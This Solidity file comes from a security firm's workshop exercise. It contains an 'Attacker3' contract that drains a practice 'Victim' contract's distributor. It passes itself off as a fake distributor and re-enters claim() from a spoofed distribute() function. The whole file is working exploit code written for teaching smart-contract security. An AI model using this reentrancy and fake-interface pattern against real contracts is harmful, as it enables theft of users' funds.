// SPDX-License-Identifier: GPL-3.0
/**  Do NOT use this code in production **
 __      __       _ _                _____       _       _   _                 
 \ \    / /      (_| |              / ____|     | |     | | (_)                
  \ \  / ___ _ __ _| | ___   __ _  | (___   ___ | |_   _| |_ _  ___  _ __  ___ 
   \ \/ / _ | '__| | |/ _ \ / _` |  \___ \ / _ \| | | | | __| |/ _ \| '_ \/ __|
    \  |  __| |  | | | (_) | (_| |  ____) | (_) | | |_| | |_| | (_) | | | \__ \
     \/ \___|_|  |_|_|\___/ \__, | |_____/ \___/|_|\__,_|\__|_|\___/|_| |_|___/
                             __/ |                                             
                            |___/                                              
                                               
Verilog Solutions Inc. https://www.verilog.solutions
Verilog is a full-stack web3 security firm, covering smart contract auditing, 
validator operations, venture investment, and incubation.
Glad to prepare and present the materials for Game Day Remix in DevConnect Amsterdam!
*/

pragma solidity 0.8.6;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IDistributor } from "./interface/IDistributor.sol";
import { IVictim } from "./interface/IVictim.sol";

contract Attacker3 is IDistributor {
	IERC20 public token;
	IVictim public victim;
	IDistributor public distributor;

	constructor(
		address victimAddr,
		address tokenAddr,
		address distributorAddr
	) {
		victim = IVictim(victimAddr);
		token = IERC20(tokenAddr);
		distributor = IDistributor(distributorAddr);
	}

	function attack(uint256 amount) external {
		token.transferFrom(msg.sender, address(this), amount);
		token.approve(address(victim), amount);
		victim.deposit(amount);
		victim.claim(IDistributor(address(this)), address(this));
	}

	/// @notice oh~hh this is not the real distribute() function!
	function distribute(address recipient, uint256 amount) external override {
		// mute warnings
		recipient;
		amount;
		if (msg.sender != address(victim)) {
			revert("Attacker:: Not the target.");
		}
		if (token.balanceOf(address(distributor)) > 10**18) {
			victim.claim(distributor, address(this));
			victim.claim(IDistributor(address(this)), address(this));
		}
	}
}
